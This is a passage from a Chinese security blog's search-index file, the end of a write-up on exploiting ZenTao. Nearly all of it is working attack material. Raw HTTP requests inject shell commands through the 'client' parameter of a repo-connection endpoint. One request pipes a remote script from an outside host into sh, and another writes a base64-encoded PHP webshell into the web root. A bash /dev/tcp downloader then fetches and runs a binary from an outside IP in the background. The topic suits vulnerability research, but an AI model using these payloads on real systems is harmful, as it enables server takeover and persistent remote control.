text/javascript, */*; q=0.01</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://192.168.234.130:8080/zentao/doc.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Cookie: zentaosid=98de9bd442371e82a30b8fba4af6b298;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">client=`curl+http://192.168.234.130:7777/1.txt|sh`&amp;SCM=Subversion</span><br></pre></td></tr></table></figure><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>也可以直接用echo写base64编码后的webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-getModel-repo-checkConnection.html HTTP/1.1</span><br><span class="line">Host: 110.xxx.xxx.215:8081</span><br><span class="line">Origin: http://110.xxx.xxx.215:8081</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.xxx.xxx.215:8081/theme/default/zh-cn.default.css?v=18.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Cookie: preferred_language=zh_CN; zentaosid=8b9ab44be587c54d315569f119a8715e; lang=zh-cn; device=desktop; theme=default; sidebar_collapsed=false; windowWidth=800; windowHeight=541; tab=system</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1194</span><br><span class="line"></span><br><span class="line">client=`echo+&#x27;PD9waHAKQHNlc3Npb25fc3RhcnQoKTsKQHNldF90aW1lX2xpbWl0KDApOwpAZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBlbmNvZGUoJEQsJEspewogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7CiAgICAgICAgJGMgPSAkS1skaSsxJjE1XTsKICAgICAgICAkRFskaV0gPSAkRFskaV1eJGM7CiAgICB9CiAgICByZXR1cm4gJEQ7Cn0KJHBhc3M9J3Bhc3MnOwokcGF5bG9hZE5hbWU9J3BheWxvYWQnOwoka2V5PSczYzZlMGI4YTljMTUyMjRhJzsKaWYgKGlzc2V0KCRfUE9TVFskcGFzc10pKXsKICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOwogICAgaWYgKGlzc2V0KCRfU0VTU0lPTlskcGF5bG9hZE5hbWVdKSl7CiAgICAgICAgJHBheWxvYWQ9ZW5jb2RlKCRfU0VTU0lPTlskcGF5bG9hZE5hbWVdLCRrZXkpOwogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsKICAgICAgICAgICAgJHBheWxvYWQ9ZW5jb2RlKCRwYXlsb2FkLCRrZXkpOwogICAgICAgIH0KCQlldmFsKCRwYXlsb2FkKTsKICAgICAgICBlY2hvIHN1YnN0cihtZDUoJHBhc3MuJGtleSksMCwxNik7CiAgICAgICAgZWNobyBiYXNlNjRfZW5jb2RlKGVuY29kZShAcnVuKCRkYXRhKSwka2V5KSk7CiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsKICAgIH1lbHNlewogICAgICAgIGlmIChzdHJwb3MoJGRhdGEsImdldEJhc2ljc0luZm8iKSE9PWZhbHNlKXsKICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOwogICAgICAgIH0KICAgIH0KfQo=&#x27;+|base64+-d+&gt;+/apps/zentao/www/api1.php`&amp;SCM=Subversion</span><br></pre></td></tr></table></figure><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p>也可以通过echo写个bash脚本到本地然后执行上马操作</p><p>如果遇到docker环境没有curl或者wget可以参考下面文章进行下载</p><p><a href="https://mp.weixin.qq.com/s/ntjMPeqypK8W1xs287W1RQ">https://mp.weixin.qq.com/s/ntjMPeqypK8W1xs287W1RQ</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __download() &#123; read proto server path &lt;&lt;&lt;$(echo $&#123;1//// &#125;); DOC=/$&#123;path// //&#125;; HOST=$&#123;server//:*&#125;; PORT=$&#123;server//*:&#125;; [[ x&quot;$&#123;HOST&#125;&quot; == x&quot;$&#123;PORT&#125;&quot; ]] &amp;&amp; PORT=80; exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$PORT; echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3; (while read line; do [[ &quot;$line&quot; == $&#x27;\r&#x27; ]] &amp;&amp; break; done &amp;&amp; cat) &lt;&amp;3; exec 3&gt;&amp;-; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__download http://xx.47.xxx.234:7227/linux &gt; /tmp/linux &amp;&amp;chmod +x /tmp/linux &amp;&amp; nohup /tmp/linux &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> zentao </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
